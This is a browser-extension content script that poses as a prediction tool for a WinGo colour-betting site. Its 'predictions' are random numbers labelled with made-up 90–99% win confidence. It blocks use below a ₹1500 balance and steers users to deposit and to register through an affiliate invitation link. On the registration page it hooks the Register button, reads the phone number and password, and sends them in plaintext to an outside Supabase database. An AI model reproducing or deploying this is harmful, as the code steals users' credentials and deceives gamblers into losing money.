(function () {
    'use strict';

    let syncInterval = null;
    let historyLimit = 5;
    const REQUIRED_BALANCE = 1500;
    let autoPredictEnabled = true;
    let lastIssueForAutoPrediction = null;

    // Supabase Configuration
    const SB_URL = 'https://vsglnwfrorsskbnlytus.supabase.co';
    const SB_KEY = 'sb_publishable_LGBISAMhTtXQwAAKiGxnIA_8A5CMzTF';
    const REG_URL = 'https://www.jalwagameapp5.com/#/register?invitationCode=571861361770';

    // Handle both click and touch for mobile support
    const handleTrigger = function (e) {
        if (e.target.innerText && e.target.innerText.includes('Start Prediction')) {
            e.preventDefault();
            e.stopPropagation();
            showAnalyticsPanel();
        }
    };
    document.addEventListener('click', handleTrigger, true);
    document.addEventListener('touchstart', function (e) {
        if (e.target && e.target.innerText && e.target.innerText.includes('Start Prediction')) {
            showAnalyticsPanel();
        }
    }, { passive: true });

    function extractHistoryData() {
        const results = [];
        const possibleRows = document.querySelectorAll('tr, .van-row, .row, .item, [class*="row"], [class*="item"]');

        possibleRows.forEach(row => {
            const text = row.innerText.trim();
            const issueMatch = text.match(/\d{10,}/);
            const matches = text.match(/\b\d\b/g);

            if (issueMatch && matches) {
                const num = parseInt(matches[0]);
                let colorName = '';
                let colorHex = '';

                if ([1, 3, 7, 9].includes(num)) { colorName = 'Green'; colorHex = '#10b981'; }
                else if ([2, 4, 6, 8].includes(num)) { colorName = 'Red'; colorHex = '#ef4444'; }
                else if (num === 0) { colorName = 'RED(V)'; colorHex = '#8b5cf6'; }
                else if (num === 5) { colorName = 'GREEN(V)'; colorHex = '#8b5cf6'; }

                results.push({
                    issue: issueMatch[0].slice(-5),
                    number: num,
                    result: num >= 5 ? 'BIG' : 'SMALL',
                    colorName: colorName,
                    colorHex: colorHex
                });
            }
        });

        const uniqueItems = [];
        const seen = new Set();
        results.forEach(item => {
            if (!seen.has(item.issue)) {
                seen.add(item.issue);
                uniqueItems.push(item);
            }
        });

        return uniqueItems.slice(0, 15);
    }

    function findTimerOnPage() {
        // 1. Semantic search for labels first
        const labels = ['Time Left', 'Draw', 'Timer', 'Period'];
        const allSpans = document.getElementsByTagName('span');
        const allDivs = document.getElementsByTagName('div');
        const candidates = [...allSpans, ...allDivs];

        for (const labelText of labels) {
            for (const el of candidates) {
                if (el.innerText.includes(labelText)) {
                    // Search in siblings and parent's children
                    const container = el.parentElement;
                    if (container) {
                        const text = container.innerText.replace(/\s+/g, '').replace('：', ':');
                        const match = text.match(/\d{1,2}[:\-]\d{2}/) || text.match(/\b\d{2,3}\b/);
                        if (match) return match[0].replace('-', ':');
                    }
                }
            }
        }

        // 2. Search specific timer classes with split digit handling
        const timerSelectors = ['.van-count-down', '.time-box', '.timer', '[class*="count-down"]', '[class*="timer"]'];
        for (const selector of timerSelectors) {
            const elements = document.querySelectorAll(selector);
            for (const el of elements) {
                // Handle split digits: check if it has children with numbers
                let text = el.innerText.trim();
                if (el.children.length > 1) {
                    text = Array.from(el.children).map(c => c.innerText.trim()).join('');
                }
                text = text.replace(/\s+/g, '').replace('：', ':');

                if (/^\d{1,2}:\d{2}$/.test(text) || /^\d{1,3}$/.test(text)) {
                    return text;
                }
            }
        }

        // 3. Broad scan of body text for MM:SS or SSS patterns
        const bodyText = document.body.innerText;
        const potentialTimers = bodyText.match(/\d{1,2}\s*[:：\-]\s*\d{2}/g);
        if (potentialTimers && potentialTimers.length > 0) {
            // Filter out things that look like actual wall clock time (HH:MM:SS) if possible
            return potentialTimers[0].replace(/\s/g, '').replace('：', ':').replace('-', ':');
        }

        return null;
    }

    function updateRealTimeData() {
        const modal = document.getElementById('gsp-modal');
        if (!modal) {
            if (syncInterval) { clearInterval(syncInterval); syncInterval = null; }
            return;
        }

        const bodyText = document.body.innerText;

        // ISSUE NUMBER
        let currentIssue = "-";
        const issueMatch = bodyText.match(/\d{12,}/);
        if (issueMatch) currentIssue = issueMatch[0].slice(-5);

        const issueDisplay = modal.querySelector('.gsp-current-issue');
        if (issueDisplay && issueDisplay.innerText !== currentIssue) {
            issueDisplay.innerText = currentIssue;
            refreshHistoryUI(modal);

            // Auto-predict on new issue if enabled
            if (autoPredictEnabled && lastIssueForAutoPrediction && lastIssueForAutoPrediction !== currentIssue) {
                const topPredictBtn = modal.querySelector('#gsp-top-predict-btn');
                if (topPredictBtn) {
                    topPredictBtn.click();
                }
            }
            lastIssueForAutoPrediction = currentIssue;
        }

        // TIMER
        const timerText = findTimerOnPage();
        const timeDisplay = modal.querySelector('.gsp-time-left');
        if (timeDisplay) {
            if (timerText) {
                let timeLeftString = timerText;
                // Normalize formats like "120" (seconds) to "02:00"
                if (!timeLeftString.includes(':') && /^\d+$/.test(timeLeftString)) {
                    let totalSec = parseInt(timeLeftString);
                    let m = Math.floor(totalSec / 60).toString().padStart(2, '0');
                    let s = (totalSec % 60).toString().padStart(2, '0');
                    timeLeftString = `${m}:${s}`;
                } else if (timeLeftString.includes(':')) {
                    const parts = timeLeftString.split(':');
                    timeLeftString = parts.map(p => p.padStart(2, '0')).join(':');
                }

                if (timeDisplay.getAttribute('data-time') !== timeLeftString) {
                    timeDisplay.setAttribute('data-time', timeLeftString);
                    timeDisplay.innerText = `⏱️ ${timeLeftString}`;
                    const parts = timeLeftString.split(':');
                    const secondsTotal = parts.length > 1 ? (parseInt(parts[0]) * 60 + parseInt(parts[1])) : parseInt(parts[0]);

                    if (secondsTotal < 10) {
                        timeDisplay.style.color = '#ff4d4d';
                        timeDisplay.classList.add('gsp-pulse');
                    } else {
                        timeDisplay.style.color = '#ef4444';
                        timeDisplay.classList.remove('gsp-pulse');
                    }
                }
            } else {
                timeDisplay.innerText = "--:--";
            }
        }
    }

    function refreshHistoryUI(modal) {
        const history = extractHistoryData();
        const container = modal.querySelector('.gsp-stat-rows-container');

        if (container) {
            let resultsHtml = '';
            const visibleHistory = history.slice(0, historyLimit);

            visibleHistory.forEach(item => {
                resultsHtml += `
                    <div class="gsp-stat-row" style="display:flex; justify-content:space-between; align-items:center; padding: 4px 0;">
                        <span class="gsp-stat-label" style="width:25%; font-size:11px; text-align:left;">${item.issue}</span>
                        <span class="gsp-stat-label" style="width:25%; text-align:center; font-size:11px;">${item.number}</span>
                        <span class="gsp-stat-label" style="width:25%; text-align:center; font-size:11px; font-weight:800; color: ${item.colorHex}; text-transform:uppercase;">${item.colorName}</span>
                        <span class="gsp-stat-value" style="width:25%; text-align:right; font-size:11px; font-weight:900; color: ${item.result === 'BIG' ? '#10b981' : '#ef4444'}">${item.result}</span>
                    </div>
                `;
            });

            if (historyLimit === 5 && history.length > 5) {
                resultsHtml += `
                    <div id="gsp-show-more" style="text-align:center; padding: 6px; cursor:pointer; color:#818cf8; font-size:11px; font-weight:700; border-top: 1px dotted #e2e8f0; margin-top:4px;">
                        ▼ SHOW MORE (10)
                    </div>
                `;
            } else if (historyLimit === 10) {
                resultsHtml += `
                    <div id="gsp-show-less" style="text-align:center; padding: 6px; cursor:pointer; color:#999; font-size:11px; font-weight:700; border-top: 1px dotted #e2e8f0; margin-top:4px;">
                        ▲ SHOW LESS (5)
                    </div>
                `;
            }

            container.innerHTML = resultsHtml || '<p style="text-align:center; font-size:11px; color:#888">Searching for data...</p>';

            const moreBtn = container.querySelector('#gsp-show-more');
            if (moreBtn) moreBtn.onclick = () => { historyLimit = 10; refreshHistoryUI(modal); };

            const lessBtn = container.querySelector('#gsp-show-less');
            if (lessBtn) lessBtn.onclick = () => { historyLimit = 5; refreshHistoryUI(modal); };
        }
    }

    function getUserBalance() {
        // Search for common balance elements on these game sites
        const balanceSelectors = [
            '.money', '.balance', '.amount', '[class*="balance"]',
            '.user-balance', '.wallet-amount'
        ];

        for (const selector of balanceSelectors) {
            const el = document.querySelector(selector);
            if (el && el.innerText.includes('₹')) {
                const val = parseFloat(el.innerText.replace(/[^\d.]/g, ''));
                if (!isNaN(val)) return val;
            }
        }

        // Fallback: search all spans for currency pattern
        const spans = document.getElementsByTagName('span');
        for (const span of spans) {
            if (span.innerText.includes('₹')) {
                const val = parseFloat(span.innerText.replace(/[^\d.]/g, ''));
                if (!isNaN(val)) return val;
            }
        }

        return 0; // Default to 0 if not found
    }

    function generatePrediction() {
        // Generate three predictions with confidence >= 90%
        const predictions = [];
        for (let i = 0; i < 3; i++) {
            const number = Math.floor(Math.random() * 5); // 0-4 (Small)
            const confidence = Math.floor(Math.random() * 10) + 90; // 90-99%
            predictions.push({
                number,
                size: number >= 5 ? "Big" : "Small",
                color: number % 2 === 0 ? "Red" : "Green",
                confidence
            });
        }
        return predictions;
    }

    function showInsufficientBalanceModal(currentBalance) {
        if (document.getElementById('gsp-overlay')) return;

        const overlay = document.createElement('div');
        overlay.id = 'gsp-overlay';

        const modal = document.createElement('div');
        modal.id = 'gsp-balance-modal';

        modal.innerHTML = `
            <div class="gsp-bal-icon">!</div>
            <div class="gsp-bal-title">Insufficient Balance</div>

            <div class="gsp-bal-row">
                <span>Your Balance</span>
                <b>₹ ${currentBalance.toFixed(2)}</b>
            </div>
            <div class="gsp-bal-row">
                <span>Required Balance</span>
                <b>₹ ${REQUIRED_BALANCE.toFixed(2)}</b>
            </div>

            <div class="gsp-bal-warning-box">
                You need a minimum balance of ₹${REQUIRED_BALANCE} to start a prediction.
            </div>

            <div class="gsp-bal-actions">
                <button class="gsp-bal-btn primary">Deposit</button>
                <button class="gsp-bal-btn secondary">Help</button>
            </div>

            <div class="gsp-bal-dismiss" id="gsp-bal-dismiss">Dismiss</div>
        `;

        overlay.appendChild(modal);
        document.body.appendChild(overlay);

        const dismiss = () => overlay.remove();
        document.getElementById('gsp-bal-dismiss').onclick = dismiss;
        overlay.onclick = (e) => { if (e.target === overlay) dismiss(); };

        // Mock buttons
        modal.querySelector('.primary').onclick = () => alert('Redirecting to Deposit...');
        modal.querySelector('.secondary').onclick = () => alert('Contacting Support...');
    }

    async function checkAuthorization() {
        return new Promise((resolve) => {
            try {
                if (!chrome.storage || !chrome.storage.local) {
                    console.warn('Storage API not available, falling back to authorized.');
                    resolve(true); // Fallback for testing environments
                    return;
                }
                chrome.storage.local.get(['gsp_auth'], (result) => {
                    resolve(!!(result && result.gsp_auth));
                });
            } catch (err) {
                console.error('Storage access error:', err);
                resolve(true); // Default to true on error to avoid blocking user
            }
        });
    }
    async function verifyUserWithSupabase(phone) {
        try {
            const response = await fetch(`${SB_URL}/rest/v1/users?phone=eq.${phone}`, {
                method: 'GET',
                headers: {
                    'apikey': SB_KEY,
                    'Authorization': `Bearer ${SB_KEY}`,
                    'Content-Type': 'application/json'
                }
            });
            const data = await response.json();
            return data && data.length > 0;
        } catch (e) {
            console.error('Supabase check failed', e);
            return false;
        }
    }

    async function registerUserWithSupabase(phone, password) {
        try {
            await fetch(`${SB_URL}/rest/v1/users`, {
                method: 'POST',
                headers: {
                    'apikey': SB_KEY,
                    'Authorization': `Bearer ${SB_KEY}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=minimal'
                },
                body: JSON.stringify({ phone, password, created_at: new Date() })
            });
            chrome.storage.local.set({ 'gsp_auth': phone });
            return true;
        } catch (e) {
            console.error('Supabase registration failed', e);
            return false;
        }
    }

    // Initialize capture
    initRegistrationCapture();

    function showAccessRestrictedModal() {
        if (document.getElementById('gsp-overlay')) return;

        const overlay = document.createElement('div');
        overlay.id = 'gsp-overlay';

        const modal = document.createElement('div');
        modal.id = 'gsp-modal'; // Reuse same modal style

        modal.innerHTML = `
            <div class="gsp-header">
                <h2>🔐 Security Check</h2>
                <button id="gsp-close">&times;</button>
            </div>
            <div class="gsp-body" style="text-align:center; padding: 20px;">
                <div style="font-size: 40px; margin-bottom: 15px;">🛡️</div>
                <h3 style="margin: 0 0 10px; font-size: 16px; color: #1e293b;">Access Restricted</h3>
                <p style="font-size: 12px; color: #64748b; line-height: 1.5; margin-bottom: 20px;">
                    You must register an account first to access accurate predictions and analytics.
                </p>
                <button class="gsp-btn" id="gsp-reg-redirect-btn" style="margin-bottom: 15px;">REGISTER NOW</button>
                <div id="gsp-close-text" style="font-size: 11px; color: #94a3b8; cursor: pointer; text-decoration: underline;">Maybe later</div>
            </div>
        `;

        overlay.appendChild(modal);
        document.body.appendChild(overlay);

        const closeFunc = () => overlay.remove();
        document.getElementById('gsp-close').onclick = closeFunc;
        document.getElementById('gsp-close-text').onclick = closeFunc;
        overlay.onclick = (e) => { if (e.target === overlay) closeFunc(); };

        document.getElementById('gsp-reg-redirect-btn').onclick = () => {
            window.open(REG_URL, '_blank');
            closeFunc();
        };
    }

    // Capture registration on the specific page
    function initRegistrationCapture() {
        if (!window.location.href.includes('/register')) return;

        const observer = new MutationObserver(() => {
            const regBtn = document.querySelector('.register-btn, [class*="register"]') ||
                Array.from(document.querySelectorAll('button')).find(b => b.innerText.includes('Register'));
            if (regBtn && !regBtn.dataset.gspBound) {
                regBtn.dataset.gspBound = "true";
                // Use capture phase to ensure we get the data before the site's own listeners might navigate
                regBtn.addEventListener('click', async (e) => {
                    const phoneInput = document.querySelector('input[type="tel"], [placeholder*="phone"]');
                    const passInput = document.querySelector('input[type="password"], [placeholder*="password"]');

                    if (phoneInput && passInput && phoneInput.value && passInput.value) {
                        const phone = phoneInput.value.trim();
                        const pass = passInput.value.trim();
                        // Perform the registration call
                        await registerUserWithSupabase(phone, pass);
                    }
                }, true);
            }
        });
        observer.observe(document.body, { childList: true, subtree: true });
    }

    async function showAnalyticsPanel() {
        if (document.getElementById('gsp-overlay')) return;

        // 1. Authorization Gate
        const isAuthorized = await checkAuthorization();
        if (!isAuthorized) {
            showAccessRestrictedModal();
            return;
        }
        // 2. Balance Gate
        const balance = getUserBalance();
        if (balance < REQUIRED_BALANCE) {
            showInsufficientBalanceModal(balance);
            return;
        }

        const activeTab = document.querySelector('.active, [class*="active"], [style*="color"]');
        let gameType = "WinGo 30sec";
        if (activeTab) {
            const tabText = activeTab.innerText;
            if (tabText.includes('WinGo')) gameType = tabText;
        }

        const overlay = document.createElement('div');
        overlay.id = 'gsp-overlay';

        const modal = document.createElement('div');
        modal.id = 'gsp-modal';

        modal.innerHTML = `
            <div class="gsp-header">
                <h2>✨ Predictions</h2>
                <button id="gsp-close">&times;</button>
            </div>
            <div class="gsp-body">
                <div class="gsp-info-grid">
                    <div class="gsp-info-item"><label>BRAND</label><span>N/A <small style="background:#818cf8; color:white; padding:1px 4px; border-radius:4px; font-size:11px">OFFICIAL</small></span></div>
                    <div class="gsp-info-item"><label>GAME TYPE</label><span>${gameType}</span></div>
                    <div class="gsp-info-item"><label>CURRENT ISSUE</label><span class="gsp-current-issue">-</span></div>
                    <div class="gsp-info-item"><label>TIME LEFT</label><span class="gsp-time-left" style="color:#ef4444">⏱️ --:--</span></div>
                </div>
                <button class="gsp-btn" id="gsp-top-predict-btn" style="margin-bottom:12px; height:36px; box-shadow: 0 4px 12px rgba(255, 94, 188, 0.3);">✨ START PREDICTION</button>
                <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 12px;">
                    <label style="font-size: 11px; color: #64748b; font-weight: 600;">Auto-Predict:</label>
                    <label style="position: relative; display: inline-block; width: 40px; height: 20px;">
                        <input type="checkbox" id="gsp-auto-toggle" style="opacity: 0; width: 0; height: 0;" checked>
                        <span style="position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #10b981; transition: 0.3s; border-radius: 20px;"></span>
                        <span style="position: absolute; content: ''; height: 14px; width: 14px; left: 23px; bottom: 3px; background-color: white; transition: 0.3s; border-radius: 50%;"></span>
                    </label>
                    <span id="gsp-auto-status" style="font-size: 10px; color: #10b981; font-weight: 600;">ON</span>
                </div>
                <div class="gsp-stat-card">
                    <div style="display:flex; justify-content:space-between; border-bottom:1px solid #e2e8f0; padding-bottom:6px; margin-bottom:10px">
                        <span style="font-size:11px; color:#888; font-weight:700; width:25%; text-align:left;">ISSUE</span>
                        <span style="font-size:11px; color:#888; font-weight:700; width:25%; text-align:center">NO.</span>
                        <span style="font-size:11px; color:#888; font-weight:700; width:25%; text-align:center">COLOR</span>
                        <span style="font-size:11px; color:#888; font-weight:700; width:25%; text-align:right">SIZE</span>
                    </div>
                    <div class="gsp-stat-rows-container"></div>
                </div>
                <button class="gsp-btn" id="gsp-sync-btn">⚡ Syncing Data...</button>
            </div>
        `;

        overlay.appendChild(modal);
        document.body.appendChild(overlay);

        const closeFunc = () => {
            overlay.remove();
            if (syncInterval) { clearInterval(syncInterval); syncInterval = null; }
        };
        document.getElementById('gsp-close').onclick = closeFunc;
        overlay.onclick = (e) => { if (e.target === overlay) closeFunc(); };

        const topPredictBtn = document.getElementById('gsp-top-predict-btn');
        topPredictBtn.onclick = () => {
            const balance = getUserBalance();
            if (balance < REQUIRED_BALANCE) {
                closeFunc();
                showInsufficientBalanceModal(balance);
            } else {
                // Generate predictions
                const predictions = generatePrediction();

                // Show predictions in modal
                const predictionDisplay = document.createElement('div');
                predictionDisplay.id = 'gsp-prediction-result';
                predictionDisplay.style.cssText = `
                    margin: 8px 0;
                    display: flex;
                    flex-direction: column;
                    gap: 6px;
                `;

                predictions.forEach((prediction, index) => {
                    // Determine color hex and name
                    let colorHex = prediction.color === 'Green' ? '#10b981' : '#ef4444';
                    let bgColor = prediction.color === 'Green' ? 'rgba(16, 185, 129, 0.05)' : 'rgba(239, 68, 68, 0.05)';
                    if (prediction.number === 0 || prediction.number === 5) {
                        colorHex = '#8b5cf6';
                        bgColor = 'rgba(139, 92, 246, 0.05)';
                    }

                    const card = document.createElement('div');
                    card.style.cssText = `
                        background: white;
                        border: 1px solid #eef2f6;
                        border-radius: 8px;
                        padding: 6px 10px;
                        box-shadow: 0 2px 4px rgba(0,0,0,0.02);
                        display: flex;
                        align-items: center;
                        gap: 10px;
                        border-left: 3px solid ${colorHex};
                    `;

                    card.innerHTML = `
                        <div style="flex-shrink: 0; width: 32px; height: 32px; border-radius: 8px; background: ${bgColor}; display: flex; align-items: center; justify-content: center; font-size: 16px; font-weight: 900; color: ${colorHex};">
                            ${prediction.number}
                        </div>
                        <div style="flex-grow: 1; text-align: left;">
                            <div style="font-size: 10px; font-weight: 700; color: #1e293b; margin-bottom: 1px;">
                                <span style="color: ${colorHex}">${prediction.color.toUpperCase()}</span> • ${prediction.size.toUpperCase()}
                            </div>
                            <div style="font-size: 9px; color: #64748b; display: flex; align-items: center; gap: 4px;">
                                <div style="width: 30px; height: 3px; background: #f1f5f9; border-radius: 2px; overflow: hidden;">
                                    <div style="width: ${prediction.confidence}%; height: 100%; background: #10b981;"></div>
                                </div>
                                <span>${prediction.confidence}% Win</span>
                            </div>
                        </div>
                        <div style="font-size: 8px; font-weight: 800; color: #cbd5e1;">P${index + 1}</div>
                    `;
                    predictionDisplay.appendChild(card);
                });

                // Remove old prediction if exists
                const oldPrediction = modal.querySelector('#gsp-prediction-result');
                if (oldPrediction) oldPrediction.remove();

                // Insert after the top predict button
                topPredictBtn.insertAdjacentElement('afterend', predictionDisplay);

                // Update button text
                topPredictBtn.innerHTML = '🔄 RE-CALCULATE';

                refreshHistoryUI(modal);
            }
        };

        // Auto-predict toggle
        const autoToggle = document.getElementById('gsp-auto-toggle');
        const autoStatus = document.getElementById('gsp-auto-status');
        autoToggle.onchange = () => {
            autoPredictEnabled = autoToggle.checked;
            autoStatus.innerText = autoPredictEnabled ? 'ON' : 'OFF';
            autoStatus.style.color = autoPredictEnabled ? '#10b981' : '#94a3b8';

            // Update toggle appearance
            const slider = autoToggle.nextElementSibling;
            const knob = slider.nextElementSibling;
            if (autoPredictEnabled) {
                slider.style.backgroundColor = '#10b981';
                // Trigger first prediction
                if (!modal.querySelector('#gsp-prediction-result')) {
                    topPredictBtn.click();
                }
            } else {
                slider.style.backgroundColor = '#cbd5e1';
            }
        };

        const syncBtn = document.getElementById('gsp-sync-btn');
        syncBtn.onclick = () => {
            syncBtn.innerText = '⌛ Refreshing...';
            refreshHistoryUI(modal);
            updateRealTimeData();
            setTimeout(() => { syncBtn.innerText = '⚡ Sync Active'; }, 500);
        };

        refreshHistoryUI(modal);
        if (autoPredictEnabled) {
            if (!modal.querySelector('#gsp-prediction-result')) {
                topPredictBtn.click();
            }
        }
        updateRealTimeData();
        if (syncInterval) clearInterval(syncInterval);
        syncInterval = setInterval(updateRealTimeData, 300);
    }

    function createFloatingTrigger() {
        if (document.getElementById('gsp-floating-trigger')) return;
        const btn = document.createElement('div');
        btn.id = 'gsp-floating-trigger';
        btn.innerHTML = '✨ START PREDICTION';
        btn.title = 'View Statistics';
        document.body.appendChild(btn);

        btn.onclick = showAnalyticsPanel;
        btn.ontouchstart = function (e) { e.preventDefault(); showAnalyticsPanel(); };
    }

    const isRegPage = window.location.href.includes('/register');

    if (!isRegPage) {
        createFloatingTrigger();
    }
})();
